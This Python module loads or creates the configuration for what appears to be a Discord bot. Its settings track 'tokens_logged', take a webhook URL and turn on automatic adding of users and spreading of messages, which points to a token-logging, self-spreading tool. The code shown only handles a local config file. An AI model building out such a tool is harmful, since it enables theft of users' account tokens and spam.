import json
import os

class _Config(dict):
    def __init__(self):
        self.load_config()

    def write(self):
        with open("config.json", "w") as f:
            f.write(json.dumps(self, indent=4))

    def setup_config(self):
        default_config = {
                "bot_prefix": "$",
                "tokens_logged": 0,
                "webhook_url": "",
                "bot_token": "",
                "auto_add": {
                    "enabled": True,
                    "users": []
                },
                "auto_spread": {
                    "enabled": True,
                    "messages": ["your message"],
                },
                "servers": {},
        }

        default_config['bot_token'] = input('Input your bot token: ')
        default_config['webhook_url'] = input('Input your webhook URL: ')

        return default_config
        

    def load_config(self):
        try:
            super().__init__(json.load(open("config.json")))
        except FileNotFoundError:
            default_config = self.setup_config()
            
            with open("config.json", "w") as f:
                f.write(json.dumps(default_config, indent=4))
            exit()
        except json.decoder.JSONDecodeError:
            input("Failed to parse config.json... ")
            exit()

screensess = os.getenv('STY')
config = _Config()
